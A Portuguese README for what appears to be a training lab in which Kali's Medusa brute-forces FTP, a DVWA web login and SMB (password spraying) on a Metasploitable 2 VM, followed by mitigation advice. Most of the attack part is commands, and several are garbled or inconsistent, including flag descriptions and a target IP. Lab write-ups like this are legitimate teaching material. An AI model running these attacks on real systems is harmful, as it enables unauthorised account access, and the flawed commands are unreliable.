**Projeto: Ataques de Força Bruta com Kali + Medusa (Ambiente Controlad**o)



Este repositório contém a documentação do desafio DIO: montar um ambiente com Kali Linux e Metasploitable 2, usar a ferramenta Medusa para executar ataques de força bruta em serviços (FTP, formulários web, SMB), registrar comandos, wordlists simples, evidências e recomendações de mitigação. Tudo pensado para ambiente de teste controlado (VirtualBox — host-only / rede interna).



⚠️ **Aviso legal: execute estes testes apenas em ambientes controlados e com autorização explícita. Ataques contra sistemas que você não possui/permissão são ilegais.**



* Conteúdo do repositório
* README.md (este arquivo)
* commands.txt (todos os comandos usados)
* images/ (screenshots)



**Objetivos do projeto:**



1. Configurar duas VMs (Kali e Metasploitable 2) no VirtualBox com rede host-only / interna.
2. Realizar ataques de força bruta com Medusa em FTP, formulário web e password spraying no SMB (com enumeração de usuários).
3. Documentar wordlists, comandos, validação de acesso e recomendações de mitigação.
4. Estrutura das VMs (configuração sugerida)
5. Instalar VirtualBox.
6. Criar rede Host-Only (ou Internal Network) em VirtualBox (ex: vboxnet0).
7. VM Kali: adaptador 1 → NAT (internet, opcional para instalar pacotes), adaptador 2 → Host-Only vboxnet0 (IP 192.168.56.102).
8. VM Metasploitable2: 1 adaptador → Host-Only vboxnet0 (IP 192.168.56.101).
9. Verifique conectividade: no Kali, ping 192.168.56.101.
10. Kali Linux ( medusa, nmap, enum4linux)
11. Metasploitable 2 (contém serviços FTP, SMB, DVWA etc).
12. Medusa (audit tool para brute force; módulo ex.: ftp, http\_form, smbnt).



**Comandos - varredura inicial**



Descobrir serviços com nmap:


```bash
nmap -sV -p 21,22,80,139,445 192.168.56.101
```


**Ataque FTP com Medusa**



Objetivo: força bruta contra usuário conhecido (ex: admin) com uma wordlist pequena.



\# Exemplo: testar usuário admin com wordlists no host 192.168.56.101

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```


**Explicação das flags:**



-h host alvo



-u usuário único (use -U para arquivo de usuários)



-P caminho da wordlist de senhas



-M ftp módulo FTP



-T 6 threads (ajuste conforme ambiente)



-f encerra ao encontrar credenciais válidas



Validação: após encontrar credenciais, faça login com ftp:


```bash
ftp 192.168.56.101
```


**Ataque a formulário web (DVWA) com Medusa (http\_form)**



DVWA costuma ter login em /dvwa/login.php. Exemplo de uso do módulo http\_form (sintaxe pode variar conforme versão do Medusa; ajustar conforme sua instalação):



\# Exemplo genérico de http\_form (substitua os campos conforme o formulário real)

```bash
-m PAGE: medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \

-m FORM: 'username=^USER^\&password=^PASS^\&Login=Login' \

-m 'FAIL=Login failed' -t 6
```

Validação: tente fazer login no navegador usando as credenciais encontradas



**Password spraying em SMB (com enumeração de usuários)**



* Fluxo recomendado:
* Enumerar usuários (usar enum4linux)
* Fazer password spraying: testar um conjunto pequeno de senhas em muitos usuários (evita lockouts por tentativa excessiva em um único usuário).



\# Enumeração com enum4linux

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```


\#Crie wordlists conforme ajuste:


```bash
echo -e "user\\nmsfadmin\\nservice" > smb\_users.txt
```

```bash
echo -e "password\\n123456\\nWelcome123\\nmsfadmin" > senhas spray.txt
```


Medusa smbnt (sintaxe genérica — ajuste conforme versão):



\# Usando arquivo de usuários (-U) e uma pequena wordlist (-P)

```bash
medusa -h 192.168.56.101 -U smb\_users.txt -P senhas\_spray.txt -M smbnt -t 2 -T 50
```


* Os parâmetros -t 2 (threads) -T 50 (timeout em segundos)
* ferramentas SMB de brute‑force normalmente tentam combinações de usuário × senha. Se você fornece uma lista de usuários e uma lista de senhas, a ordem pode ser: vertical (por usuário): para cada usuário tenta muitas senhas; ou horizontal / spraying: para vários usuários tenta poucas senhas comuns.



Validação: se houver credenciais válidas, usar smbclient para acesso:


```bash
smbclient -L //192.168.56.20 -U msfadmin
```


**Recomendações de mitigação (boas práticas):**



* Política de senhas fortes: comprimento mínimo, complexidade, bloqueio após tentativas falhas.
* Rate-limiting e account lockout (com política para evitar lockouts errôneos).
* Autenticação multifator (MFA) onde possível.
* Monitoramento/alertas: IDS/IPS, logs de autenticação e alertas para muitas tentativas de login.
* Segregação de serviços e atualizações (manter serviços atualizados).
* Hardening: desabilitar serviços desnecessários; configurar FTP seguro (SFTP/FTPS) ou desativar FTP.
* Whitelist de IPs para serviços administrativos, quando aplicável.
* Educação: conscientizar sobre reutilização de senhas e engenharia social.





